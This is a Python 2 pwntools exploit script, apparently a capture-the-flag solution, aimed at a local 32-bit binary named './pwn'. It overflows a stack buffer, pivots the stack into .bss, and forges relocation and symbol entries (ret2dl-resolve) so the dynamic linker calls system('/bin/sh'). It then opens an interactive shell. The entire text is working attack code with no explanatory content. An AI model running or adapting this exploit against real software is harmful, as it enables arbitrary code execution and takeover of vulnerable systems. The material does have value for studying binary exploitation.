#!/usr/bin/env python
# coding=utf-8
from pwn import *
offset = 44
elf = ELF('./pwn')
io = process('./pwn')
rop = ROP('./pwn')
bss_addr = elf.bss()
stack_size = 0x800
base_stage = bss_addr + stack_size
rop.raw('a'*offset)
rop.read(0, base_stage, 100)
rop.migrate(base_stage)
#gdb.attach(io)
io.sendline(rop.chain())

rop = ROP('./pwn')
plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

fake_sym_addr = base_stage + 32
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr += align
index_dynsym = (fake_sym_addr - dynsym)/0x10
st_name = fake_sym_addr + 0x10 - dynstr
fake_sys = flat([st_name, 0, 0, 0x12])
index_offset = base_stage + 24 - rel_plt
read_got = elf.got['setvbuf']
r_info = index_dynsym << 8 | 0x7
fake_sys_rel = flat([read_got, r_info])
sh = '/bin/sh'
rop.raw(plt0)
rop.raw(index_offset)
rop.raw('bbbb')
rop.raw(base_stage+82)
rop.raw('bbbb')
rop.raw('bbbb')

rop.raw(fake_sys_rel)
rop.raw(align * 'a')
rop.raw(fake_sys)
rop.raw('system\x00')
rop.raw('a'*(80 - len(rop.chain())))
print len(rop.chain())
rop.raw(sh+'\x00')
rop.raw('a'*(100 - len(rop.chain())))
gdb.attach(io)
io.sendline(rop.chain())




io.interactive()
